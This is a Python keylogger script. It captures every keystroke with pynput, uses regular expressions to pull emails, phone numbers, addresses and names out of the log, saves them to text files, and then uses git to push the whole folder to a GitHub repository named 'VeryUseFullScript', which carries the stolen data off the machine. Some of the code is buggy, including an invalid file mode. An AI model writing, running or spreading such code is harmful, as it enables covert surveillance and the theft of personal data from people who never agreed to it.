import pynput.keyboard
import datetime
import re
import logging
import subprocess
import os

# Setting up date time
time = datetime.datetime.now()
time = time.strftime('%Y-%m-%d %H:%M:%S')
# Set up logging for storing keystrokes
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(message)s")

# Define a function to capture keystrokes
def on_press(key):
    try:
        # Log the key pressed (character keys like a, b, 1, etc.)
        logging.info(key.char)
    except AttributeError:
        # Handle special keys like space, enter, etc.
        logging.info(key)

def process_log():
    with open("keylog.txt", "rat") as file:
        file.write(time)
        log_data = file.read()

def get_clean_data():
    with open("keylog.txt", "r") as file:
        log_data = file.read()

    cleaned_data = ''.join([line.split(' ')[0] for line in log_data.splitlines()])
    return cleaned_data

def extracted_info(cleaned_data):
    email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
    phone_pattern = r'\+?\d{1,4}?[-.\s]?\(?\d{1,3}?\)?[-.\s]?\d{1,4}[-.\s]?\d{1,4}[-.\s]?\d{1,9}'
    address_pattern = r'\d{1,5}\s[\w\s]+(?:Street|St|Avenue|Ave|Road|Rd|Drive|Dr|Lane|Ln|Boulevard|Blvd)\s*,?\s*[\w\s]+(?:City|Town|Village|District|County|State|Province|Country)?'
    name_pattern = r'[A-Z][a-z]+\s[A-Z][a-z]+'

    emails = re.findall(email_pattern, cleaned_data)
    phone_numbers = re.findall(phone_pattern, cleaned_data)
    addresses = re.findall(address_pattern, cleaned_data)
    names = re.findall(name_pattern, cleaned_data)

    return emails, phone_numbers, addresses, names

def make_files(emails, phone_numbers, addresses, names):
    with open("emails.txt", "at") as email_file:
        email_file.write(time)
        for email in emails:
            email_file.write(f"{email}\n")

    with open("phone_numbers.txt", "at") as phones_file:
        phones_file.write(time)
        for phone_number in phone_numbers:
            phones_file.write(f"{phone_number}\n")

    with open("addresses.txt", "at") as addresses_file:
        addresses_file.write(time)
        for address in addresses:
            addresses_file.write(f"{address}\n")

    with open("names.txt", "at") as names_file:
        names_file.write(time)
        for name in names:
            names_file.write(f"{name}\n")

# Define a function to start the keylogger
def start_keylogger():
    # Collect keystrokes using the pynput listener
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()

try:
    if __name__ == "__main__":
        print("Keylogger started. Press 'Ctrl+C' to stop.")
        start_keylogger()

finally:
    # Change to your project directory
    emails, phone_numbers, addresses, names  = extracted_info(get_clean_data())
    make_files(emails, phone_numbers, addresses, names)

    project_dir = os.getcwd()
    os.chdir(project_dir)

    # Initialize a Git repository if not already initialized
    subprocess.run(['git', 'init'])

    # Set your GitHub repository remote URL
    github_username = os.getenv('GITHUB_USERNAME')
    github_token = os.getenv('GITHUB_TOKEN')
    github_repo_url = f"https://{github_username}:{github_token}@github.com/efffectery/VeryUseFullScript"

    # Add the remote if not already added
    subprocess.run(['git', 'remote', 'add', 'origin', github_repo_url])

    # Add the .txt file or all files in the folder to the Git staging area
    subprocess.run(['git', 'add', '.'])

    # Commit the changes
    subprocess.run(['git', 'commit', '-m', 'Updated'])

    # Push to GitHub
    subprocess.run(['git', 'push', '-u', 'origin', 'main'])


